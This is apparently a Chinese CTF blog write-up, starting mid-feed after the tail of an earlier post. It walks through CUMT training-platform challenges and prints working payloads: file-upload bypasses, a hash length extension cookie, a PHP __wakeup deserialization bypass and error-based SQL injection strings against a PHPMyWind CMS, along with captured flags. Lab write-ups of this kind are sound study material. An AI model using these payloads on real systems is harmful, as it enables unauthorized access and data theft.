<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">phar:</span><span class="comment">//upload/680b7502eaac53cac3f3eca74d50f537.jpg</span></span><br></pre></td></tr></table></figure>
<!-- SWPUCTF{Php_un$eri4liz3_1s_Fu^!} -->
]]></content>
      
        <categories>
            
            <category> 复现 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> CTF </tag>
            
            <tag> web </tag>
            
            <tag> misc </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[CUMT网络安全实训平台题目记录]]></title>
      <url>/2018/12/07/cumtctf/</url>
      <content type="html"><![CDATA[<p>CUMT网络安全实训平台题目记录</p>
<a id="more"></a>
<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="源代码"><a href="#源代码" class="headerlink" title="源代码"></a>源代码</h2><p>查看源代码，在最后发现一段字符</p>
<figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml"><span class="comment">&lt;!--该f配l合a你g演</span></span><span class="template-variable">&#123;出y的o我u演f视i而n不d见m别e逼2一3个3最3爱3你3的3人3即3兴3表3演&#125;</span><span class="xml"><span class="comment">--&gt;</span></span></span><br></pre></td></tr></table></figure>
<p>提取出字符即可得到flag</p>
<h2 id="colorSnake"><a href="#colorSnake" class="headerlink" title="colorSnake"></a>colorSnake</h2><p>前端题目，一头雾水，看了别人的wp，查看源代码在页面地段可以看到有一个game.js，跟过去看一下，</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">xhr(<span class="string">'./getScore.php'</span>,function(e)&#123;</span><br><span class="line">                var r = JSON.parse(e);</span><br><span class="line">                <span class="keyword">if</span>(r.state == <span class="number">200</span>)</span><br><span class="line">                    game.addScore(r.score);</span><br><span class="line">                <span class="keyword">else</span>&#123;</span><br><span class="line">                    alert(r.msg);</span><br><span class="line">                    game.start()</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;)</span><br></pre></td></tr></table></figure>
<p>尝试在控制台提交</p>
<figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">setInterval(<span class="name">function</span>()&#123;xhr('./getScore.php',function(<span class="name">e</span>)&#123;</span><br><span class="line">                var r = JSON.parse(<span class="name">e</span>)<span class="comment">;</span></span><br><span class="line">                if(<span class="name">r</span>.state == <span class="number">200</span>)</span><br><span class="line">                    game.addScore(<span class="name">r</span>.score)<span class="comment">;</span></span><br><span class="line">                else&#123;</span><br><span class="line">                    alert(<span class="name">r</span>.msg)<span class="comment">;</span></span><br><span class="line">                    game.start()</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;)&#125;,<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
<p>会发现id确实增加了，我们可以通过修改参数使它实现多次递增从而达到50分，最终payload</p>
<figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">setInterval(<span class="name">function</span>()&#123;xhr('./getScore.php',function(<span class="name">e</span>)&#123;</span><br><span class="line">                var r = JSON.parse(<span class="name">e</span>)<span class="comment">;</span></span><br><span class="line">                if(<span class="name">r</span>.state == <span class="number">200</span>)</span><br><span class="line">                    game.addScore(<span class="name">r</span>.score)<span class="comment">;</span></span><br><span class="line">                else&#123;</span><br><span class="line">                    alert(<span class="name">r</span>.msg)<span class="comment">;</span></span><br><span class="line">                    game.start()</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;)&#125;,<span class="number">1000</span>)</span><br></pre></td></tr></table></figure>
<h2 id="备份"><a href="#备份" class="headerlink" title="备份"></a>备份</h2><p>题目给出了信息</p>
<blockquote>
<p>1.bak 2.bak There are too much baks in the website ,can you find the flag in these baks?</p>
</blockquote>
<p>尝试访问1.bak，2.bak，没有发现flag，继续访问3.bak，4.bak等都存在文件，只是没有flag，猜测flag应该在某个*.bak，中，bp爆破一下，在998.bak中发现了flag</p>
<h2 id="上传一"><a href="#上传一" class="headerlink" title="上传一"></a>上传一</h2><p>题目要求上传jpg后缀，写一个PHP文件修改后缀为jpg，之后抓包修改文件名后缀为PHP再发包（因为它是在前端验证文件是否合法）</p>
<p><img src="cumtctf/2.png" alt="payload"></p>
<p>之后就可以惊喜的看到本题的flag和下个“上传2”题目的flag（2333..）</p>
<p><img src="cumtctf/3.png" alt="result"></p>
<h2 id="自动获取flag程序"><a href="#自动获取flag程序" class="headerlink" title="自动获取flag程序"></a>自动获取flag程序</h2><p>题目说了要修改一下程序，查看源代码</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 请求参数一</span></span><br><span class="line">$(<span class="string">"#a"</span>).click(function()&#123;</span><br><span class="line">    $.ajax(&#123;</span><br><span class="line">        url:<span class="string">'param1.php'</span>,</span><br><span class="line">        method:<span class="string">'get'</span>,</span><br><span class="line">        dataType:<span class="string">'json'</span>,</span><br><span class="line">        success:calParam2</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;);</span><br><span class="line"><span class="function">function <span class="title">calParam2</span><span class="params">(d)</span></span>&#123;</span><br><span class="line">    var data=JSON.parse((d.param));</span><br><span class="line">    var length=data.length;</span><br><span class="line">    var second=<span class="keyword">new</span> Date().getSeconds();</span><br><span class="line">    var sum=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (var i = <span class="number">1</span>; i &lt; length; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (var j = <span class="number">0</span>; j &lt; length/<span class="number">2</span>; j++) &#123;</span><br><span class="line">            sum+=parseInt(data[i])*second + data[j];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 请求flag</span></span><br><span class="line">    $.ajax(&#123;</span><br><span class="line">        url:<span class="string">'http://new.ctf.param.com/aram2.php?sum='</span>+sum,</span><br><span class="line">        method:<span class="string">'get'</span>,</span><br><span class="line">        dataType:<span class="string">'json'</span>,</span><br><span class="line">        success:function(s)&#123;</span><br><span class="line">            alert(s.f);</span><br><span class="line"></span><br><span class="line">        &#125;,</span><br><span class="line">        error:function(s)&#123;</span><br><span class="line">            alert(<span class="string">'错了'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>看到有个param1.php的请求，访问一下得到</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">"param"</span>:<span class="string">"["</span><span class="number">1</span><span class="string">","</span><span class="number">6</span><span class="string">","</span><span class="number">2</span><span class="string">","</span><span class="number">8</span><span class="string">","</span><span class="number">4</span><span class="string">","</span><span class="number">2</span><span class="string">","</span><span class="number">8</span><span class="string">","</span><span class="number">4</span><span class="string">","</span><span class="number">9</span><span class="string">","</span><span class="number">1</span><span class="string">","</span><span class="number">10</span><span class="string">"]"</span>&#125;</span><br></pre></td></tr></table></figure>
<!-- flag{hello,This is A Gift FoRm PHP&JS; O(∩_∩)O~} -->
<h2 id="Cookie？"><a href="#Cookie？" class="headerlink" title="Cookie？"></a>Cookie？</h2><p>查看cookie发现user值为guest，改为admin再刷新即可</p>
<p><img src="cumtctf/5.png" alt="result"></p>
<p>一看就是维吉尼亚密码，解密一下就可以了</p>
<!-- flag{thisisanoldencrypt}<-->
<h2 id="上传二"><a href="#上传二" class="headerlink" title="上传二"></a>上传二</h2><p>见上传一</p>
<h2 id="logic"><a href="#logic" class="headerlink" title="logic"></a>logic</h2><p>查看源代码可以发现</p>
<p><img src="cumtctf/1.png" alt=""></p>
<p>应该是存在vim泄漏，尝试访问 <code>submit.php.swp</code> 发现泄漏文件，关键代码如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($token)&amp;&amp;!<span class="keyword">empty</span>($emailAddress))&#123;</span><br><span class="line">	<span class="keyword">if</span>(strlen($token)!=<span class="number">10</span>) <span class="keyword">die</span>(<span class="string">'fail'</span>);</span><br><span class="line">	<span class="keyword">if</span>($token!=<span class="string">'0'</span>) <span class="keyword">die</span>(<span class="string">'fail'</span>);</span><br><span class="line">	$sql = <span class="string">"SELECT count(*) as num from `user` where token='$token' AND email='$emailAddress'"</span>;</span><br><span class="line">	$r = mysql_query($sql) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'db error'</span>);</span><br><span class="line">	$r = mysql_fetch_assoc($r);</span><br><span class="line">	$r = $r[<span class="string">'num'</span>];</span><br><span class="line">	<span class="keyword">if</span>($r&gt;<span class="number">0</span>)&#123;</span><br><span class="line">		<span class="keyword">echo</span> $flag;</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"失败了呀"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>题目一看就是很简单的弱比较，但是提交之后却无法正常回显，而是返回you are not admin，再看上图，admin应该就是chengyurui，所以邮箱为 <code>chenyurui@gmail.com</code> ，再提交一个<code>0e12345678</code> 即可。</p>
<h2 id="上传三"><a href="#上传三" class="headerlink" title="上传三"></a>上传三</h2><p>bp抓包尝试不同的后缀，尝试 <code>phtml</code> 发现可以上传成功，即上传 <code>snow.phtml</code> ，题目返回信息</p>
<p><img src="cumtctf/6.png" alt=""></p>
<p>可以看到我们的文件已经上传成功了(文件被执行了)，只是被后台查杀了，这就说明我们可以利用条件竞争来做这道题</p>
<p>用burpsuite连续发包，在写个代码连续读取</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">"http://202.119.201.199/challenge/web/uploadfile/upload/snow.phtml"</span></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">	content = requests.get(url).text</span><br><span class="line">	<span class="keyword">if</span> <span class="string">"flag"</span> <span class="keyword">in</span> content:</span><br><span class="line">		print(content)</span><br></pre></td></tr></table></figure>
<p>然后即可读到flag</p>
<!--flag{$$$_YOU_ARE_THE_BEST_GUY_HEIHEI_$$$}-->
<h2 id="is-hash-safe"><a href="#is-hash-safe" class="headerlink" title="is hash safe??"></a>is hash safe??</h2><p>题目给出了提示，应该是文件泄露，发现admin.php.swp存在，下载之，在linux下输入命令</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim -r amdin.php.swp</span><br></pre></td></tr></table></figure>
<p>即可恢复出源代码，核心代码如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$auth = <span class="keyword">false</span>;</span><br><span class="line">$role = <span class="string">"guest"</span>;</span><br><span class="line">$salt =<span class="string">"xxxxxxxxxxxxx"</span>;<span class="comment">//len:13</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_COOKIE[<span class="string">"role"</span>])) </span><br><span class="line">&#123;</span><br><span class="line">        $role = $_COOKIE[<span class="string">"role"</span>];</span><br><span class="line">        $hsh = $_COOKIE[<span class="string">"hsh"</span>];</span><br><span class="line">        <span class="keyword">if</span> (stripos($role,<span class="string">"admin"</span>)!==<span class="keyword">false</span>&amp;&amp;$hsh === md5($salt.$_COOKIE[<span class="string">"role"</span>])) </span><br><span class="line">        &#123;</span><br><span class="line">                $auth = <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">                $auth = <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123;</span><br><span class="line">        $s = $role;</span><br><span class="line">        setcookie(<span class="string">'role'</span>,$s);</span><br><span class="line">        $hsh = md5($salt.$s);</span><br><span class="line">        setcookie(<span class="string">'hsh'</span>,$hsh);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ($auth) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;h3&gt;Welcome Admin.Your flag is cumtctf&#123;you_know_this_is_not_the_flag&#125;"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;h3&gt;Only Admin can see the flag!!&lt;/h3&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>一看就是哈希长度扩展攻击</p>
<p><a href="https://blog.csdn.net/syh_486_007/article/details/51228628" target="_blank" rel="noopener">原理介绍</a><br><a href="https://www.cnblogs.com/pcat/p/5478509.html" target="_blank" rel="noopener">工具介绍</a></p>
<p>我们可以用hashpump工具来做</p>
<p>由上面介绍的原理可以知道，在本题中，参与第一次md5哈希的可控字符串为guest，也就是说，本题中，我们已知的内容有$salt（代码加的盐，具体内容未知）的长度为13，$salt与guest拼接后的MD5哈希值c70ab9d039f166c5b5f506a5698ebaa1，那么基于此，我们可以构造哈希扩展攻击</p>
<p><img src="cumtctf/4.png" alt=""></p>
<p>Input signature输入明文哈希，Input data输入第一次参与哈希的字符串的结尾的一部分，长度为$salt长度加上去掉inputdata之后字符串的长度，附加值随便，但是不能空，由于本题需要role中存在admin，所以我追加的是admin。比如本题中原来第一次参与hash的字符串为guest，我选择最后一个字符t作为inputdata，那么长度就为<code>len($salt)+len(&#39;gues&#39;)=17</code>，之后就会返回构造好的字符串和哈希值，把上面的<code>\x</code>替换为<code>%</code>，之后修改cookie值，<code>role=&gt;guest%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%90%00%00%00%00%00%00%00admin</code>，<code>hsh=&gt;37d0fe2c401a689be9608e9f850ef3de</code>，再刷新就可以得到flag了。</p>
<!--cumtctf{Md5_1s_n0t_safe} -->
<h2 id="淘金"><a href="#淘金" class="headerlink" title="淘金"></a>淘金</h2><p>这个题目的目标是抢金币达到1000即可通关，每次抢金币需要在三秒内输入验证码，成功即可抢到1金币，如果有毅力的话是可以手动抢的，或者写一个在线识别验证码的程序来自动抢也是可以的，但是这题还有更好的方案就是在我们提交验证码的环节，如果我们在请求中删去验证码字段即可成功抢到金币（也就是说验证码使可以绕过的），只是不确定这个是题目漏洞还是正解。代码如下，为了效率，同时抢多个人·</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">url_post = <span class="string">r'http://bxs.cumt.edu.cn/challenge/web/robber/dorob.php'</span></span><br><span class="line">url_get = <span class="string">r'http://bxs.cumt.edu.cn/challenge/web/robber/rob.php?id='</span></span><br><span class="line">cookies=&#123;<span class="string">"PHPSESSID"</span>:<span class="string">"2fle5nf7jrvi8lksme7uq0j1a3"</span>,<span class="string">"ssid"</span>:<span class="string">"a9598c3315159a39bbd981b8ec6fdb6d"</span>&#125;   </span><br><span class="line">s = requests.session()</span><br><span class="line">names = [<span class="string">"bxsrc"</span>,<span class="string">"333"</span>,<span class="string">"08163266"</span>,<span class="string">"EddieIvan"</span>]</span><br><span class="line">ids = [<span class="number">144</span>,<span class="number">125</span>,<span class="number">142</span>,<span class="number">109</span>]</span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(names)):</span><br><span class="line">        data = <span class="string">"user="</span>+str(ids[i])+<span class="string">"&amp;num=1"</span></span><br><span class="line">        req1 = s.get(url=url_get+str(ids[i]),cookies=cookies)</span><br><span class="line">        print(url_get+str(ids[i]))</span><br><span class="line">        req2 = s.post(url=url_post,cookies=cookies,data=data)</span><br><span class="line">    time.sleep(<span class="number">5</span>)</span><br></pre></td></tr></table></figure>
<h2 id="听说你会面向对象"><a href="#听说你会面向对象" class="headerlink" title="听说你会面向对象"></a>听说你会面向对象</h2><p>题目给出了源代码，核心代码如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag in flag.php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Admin</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file = <span class="string">'flag.php'</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($f)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = $f;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// <span class="doctag">TODO:</span> Implement __wakeup() method.</span></span><br><span class="line">        <span class="keyword">if</span> (stripos(<span class="keyword">$this</span>-&gt;file,<span class="string">'flag'</span>)+<span class="number">1</span>)&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">'dangerrous'</span>;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;file = <span class="string">'index.php'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        var_dump(<span class="keyword">$this</span>-&gt;file);</span><br><span class="line">        var_dump(file_exists(<span class="keyword">$this</span>-&gt;file));</span><br><span class="line">        <span class="comment">// <span class="doctag">TODO:</span> Implement __destruct() method.</span></span><br><span class="line">        <span class="keyword">if</span> (!strpos(<span class="keyword">$this</span>-&gt;file,<span class="string">'/'</span>)&amp;&amp;!strpos(<span class="keyword">$this</span>-&gt;file,<span class="string">'\\'</span>))&#123;</span><br><span class="line">            highlight_file(<span class="keyword">$this</span>-&gt;file);</span><br><span class="line">        &#125;<span class="keyword">else</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'你想干嘛'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>题目需要绕过需要__wakeup()函数，百度发现该处存在一个CVE漏洞 <a href="https://blog.csdn.net/qq_19876131/article/details/52890854" target="_blank" rel="noopener">Click Here</a></p>
<p>我们写php代码序列化</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Admin</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file = <span class="string">'flag.php'</span>;</span><br><span class="line">&#125;</span><br><span class="line">$obj = <span class="keyword">new</span> Admin();</span><br><span class="line"><span class="keyword">echo</span> serialize($obj);</span><br></pre></td></tr></table></figure>
<p>题目返回 <code>O:5:&quot;Admin&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;}</code> ，我们只需要把Admin后面的1修改为2然后在url编码即可，最终payload</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">O</span><span class="number">%3</span>A5<span class="number">%3</span>A<span class="number">%22</span>Admin<span class="number">%22</span><span class="number">%3</span>A2<span class="number">%3</span>A<span class="number">%7</span>Bs<span class="number">%3</span>A4<span class="number">%3</span>A<span class="number">%22</span>file<span class="number">%22</span><span class="number">%3</span>Bs<span class="number">%3</span>A8<span class="number">%3</span>A<span class="number">%22</span>flag.php<span class="number">%22</span><span class="number">%3</span>B<span class="number">%7</span>D</span><br></pre></td></tr></table></figure>
<h2 id="phpmywind"><a href="#phpmywind" class="headerlink" title="phpmywind"></a>phpmywind</h2><p>首先得到flag非常简单，题目好像出bug了，访问首页直接就可以得到flag：）</p>
<p><img src="cumtctf/7.png" alt="payload"></p>
<p>但是题目好像修复了(事实上题目本身没有任何问题，之所以可看到flag是因为已经有大佬做出来了)，所以我们还是要来一波正解</p>
<p>题目给出来cms和版本，直接百度搜索漏洞，发现有个前台sql注入漏洞，需要先注册一个合法用户，我注册了一个用户为test_snow，密码123456，登录，然后在该网址下提交如下内容(因为该题目没有回显，所以使用了报错注入)</p>
<p><img src="cumtctf/11.png" alt=""></p>
<p>于是就可以看到数据库名，说明该报错方法可用，</p>
<p><img src="cumtctf/12.png" alt=""></p>
<p>但是该语句无法使用select语句，网上查找到了另一种报错注入的方法</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">count</span>(*),<span class="keyword">concat</span>(<span class="built_in">char</span>(@<span class="string">`%27`</span>),(<span class="keyword">select</span> schema_name <span class="keyword">from</span> information_schema.schemata <span class="keyword">limit</span> <span class="number">1</span>,<span class="number">1</span>), <span class="number">0x23</span>,<span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">0</span>)*<span class="number">2</span>),<span class="built_in">char</span>(@<span class="string">`%27`</span>))x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x</span><br></pre></td></tr></table></figure>
<p>可以利用这种方法报库名，发现这个库名为 <code>phpmyflag</code> ，虽然不是当前库，但是flag应该就是在这个库中</p>
<p>爆表名</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">count</span>(*),<span class="keyword">concat</span>(<span class="built_in">char</span>(@<span class="string">`%27`</span>),(<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="number">0x7068706d79666c6167</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>), <span class="number">0x23</span>,<span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">0</span>)*<span class="number">2</span>),<span class="built_in">char</span>(@<span class="string">`%27`</span>))x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x</span><br></pre></td></tr></table></figure>
<p>本题中如果没有报错的话就会显示账号完善成功，这里只需要再次登录一下就可以了，由于题目转义过滤了单引号，所以使用了十六进制绕过</p>
<p>爆列名</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">count</span>(*),<span class="keyword">concat</span>(<span class="built_in">char</span>(@<span class="string">`%27`</span>),(<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="number">0x666c6167</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>), <span class="number">0x23</span>,<span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">0</span>)*<span class="number">2</span>),<span class="built_in">char</span>(@<span class="string">`%27`</span>))x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x</span><br></pre></td></tr></table></figure>
<p>读flag</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">count</span>(*),<span class="keyword">concat</span>(<span class="built_in">char</span>(@<span class="string">`%27`</span>),(<span class="keyword">select</span> flag <span class="keyword">from</span> phpmyflag.flag <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>), <span class="number">0x23</span>,<span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">0</span>)*<span class="number">2</span>),<span class="built_in">char</span>(@<span class="string">`%27`</span>))x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x</span><br></pre></td></tr></table></figure>
<p><img src="cumtctf/14.png" alt="result"></p>
<p>之前我以为flag在当前数据库中，走了不少弯路，看来还是自己思维太局限了</p>
<p><a href="https://www.0dayhack.com/post-764.html" target="_blank" rel="noopener">参考链接</a></p>
<!--flag{327A6C4304AD5938EAF0EFB6CC3E53DC}-->
<h1 id="BASIC"><a href="#BASIC" class="headerlink" title="BASIC"></a>BASIC</h1><h2 id="decode"><a href="#decode" class="headerlink" title="decode"></a>decode</h2><p>hex打开再base64解码即可</p>
<h2 id="白驹过隙"><a href="#白驹过隙" class="headerlink" title="白驹过隙"></a>白驹过隙</h2><p>访问题目出现</p>
<blockquote>
<p>You Have Missed the Flag ~&gt;.&lt;~</p>
</blockquote>
<p>开始猜测可能是某次返回的正确的flag，于是一连访问了1000次还是一无所获，后面想到它说 “You <strong>Missed</strong> flag”，所以思路应该是发生了302跳转，抓包也没有发现什么异常，没找到时哪儿发生了302跳转，后面一个偶然的机会，我们在原来题目链接出查看一下链接</p>
<p><img src="cumtctf/8.png" alt=""></p>
<p>再看题目页面的链接 <em>http://202.119.201.199/challenge/basic/http/defauIt.php </em> 仔细看一下，会发现两个 <code>default.php</code> 中题目给的链接中default倒数第二位是小写的L，而到了题目中变成了大写的 i ！！，如此的话跳转就清楚了，可以访问default.php(l为小写的L)</p>
<p><img src="cumtctf/9.png" alt=""></p>
<p>可以看到确实发生了302跳转，抓包</p>
<p><img src="cumtctf/10.png" alt=""></p>
<p>可以看到此处跳转到了defauIt.php(大写的i)，也可以看到我们读到了flag</p>
<p>或者你也可以直接挑战页面点击题目链接抓包，也可以读到flag，原理是一样的</p>
<!-- flag{U_a4e_A_Car3fu1_b0y} -->
<h2 id="齐白石"><a href="#齐白石" class="headerlink" title="齐白石"></a>齐白石</h2><p>16进制编辑器查看一下即可在字符串末尾看到flag</p>
<!-- flag{so_bor1ing_eMeMEMEMEM} -->
<h2 id="encode"><a href="#encode" class="headerlink" title="encode"></a>encode</h2><p>题目给出的是jsfuck代码，直接找在线网站运行一下借口得到flag</p>
<!-- flag{jj_3Nc0d3_i5_fun} -->
